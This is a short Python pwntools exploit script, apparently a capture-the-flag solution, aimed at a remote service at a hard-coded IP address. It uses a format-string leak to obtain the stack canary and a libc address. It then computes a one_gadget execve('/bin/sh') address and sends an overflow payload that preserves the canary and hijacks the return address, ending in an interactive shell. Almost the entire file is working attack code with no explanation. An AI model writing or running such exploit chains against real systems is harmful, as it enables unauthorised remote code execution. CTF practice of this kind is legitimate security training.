from pwn import *

context.update(log_level = 'debug')
#p = process('chall')
p = remote('69.172.229.147', 9002)


#leak libc
payload = '%x'*(5+8) 
payload += '|%lx'*3
p.sendline(payload)
_recv = p.recvline()
canary = int(_recv.split('|')[1], 16)
addr_libc = int(_recv.split('|')[3], 16)

offset_libc = 0x21b97
addr_libc_base = addr_libc - offset_libc
log.info('addr_libc_base: ' + hex(addr_libc_base))
log.info('canary: ' + hex(canary))

'''
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''
offset_oneshot = 0x10a38c
addr_oneshot = addr_libc_base + offset_oneshot

#raw_input('debug: ' + str(p.pid))
p.sendline('a'*63 + '\x00' + 'a'*(0x48-64) + p64(canary) + p64(addr_oneshot)*2)
log.info('addr_oneshot: ' + hex(addr_oneshot))

p.interactive()



